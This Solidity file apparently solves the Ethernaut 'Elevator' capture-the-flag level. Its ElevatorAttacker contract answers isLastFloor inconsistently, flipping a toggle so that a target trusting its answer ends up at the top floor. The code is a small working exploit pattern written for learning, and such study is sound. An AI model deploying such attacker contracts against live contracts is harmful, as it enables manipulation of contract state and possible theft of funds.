// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

interface IElevator {
    function top() external returns (bool);

    function floor() external returns (uint256);

    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    address private _owner;
    uint256 private _toggle = 1;

    constructor() {
        _owner = msg.sender;
    }

    function execute(IElevator target, uint256 floor) external {
        target.goTo(floor);
    }

    function setToggle(uint256 toggle) external {
        require(msg.sender == _owner, 'unauthorized');
        _setToggle(toggle);
    }

    function isLastFloor(uint256) external returns (bool) {
        _flipToggle();
        // toggle is already flipped so return the opposite
        return _toggle != 2;
    }

    function _flipToggle() internal {
        _toggle = 3 - _toggle; // 1 || 2
    }

    function _setToggle(uint256 toggle) internal {
        require(toggle == 1 || toggle == 2, 'bad toggle');
        if (_toggle != toggle) _toggle = toggle;
    }
}
